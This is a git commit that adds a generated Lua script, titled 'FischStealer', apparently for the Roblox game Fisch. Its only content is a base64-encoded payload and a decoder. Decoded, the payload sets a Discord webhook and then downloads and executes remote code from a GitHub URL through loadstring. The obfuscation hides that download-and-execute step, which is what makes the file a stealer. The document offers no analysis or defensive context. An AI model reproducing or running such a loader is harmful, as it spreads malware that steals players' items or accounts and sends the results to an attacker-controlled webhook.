3f01faf7f6e047bec2247124aafacc8311bb6b25
yeslidezz <leofiser111@gmail.com>
2025-03-02 12:45:17 +0100

    Generated FischStealer script ad35fe95a4e2

---
+++ scripts/ad35fe95a4e2.lua
@@ -0,0 +1,20 @@
+
+local encodedScript = "VXNlcm5hbWUgPSAiSnJFbGljMDMiCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy8xMzQ1NzIxMzg0NjcxNzc2Nzk5LzEzNDU3MjEzODQ2NzE3NzY4MDIiCgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3llc2xpZGV6ei9Fa3MwdmEvbWFpbi9GaXNjaCIpKSgp"
+
+local function decode(str)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    str = string.gsub(str, '[^'..b..'=]', '')
+    return (str:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+loadstring(decode(encodedScript))()
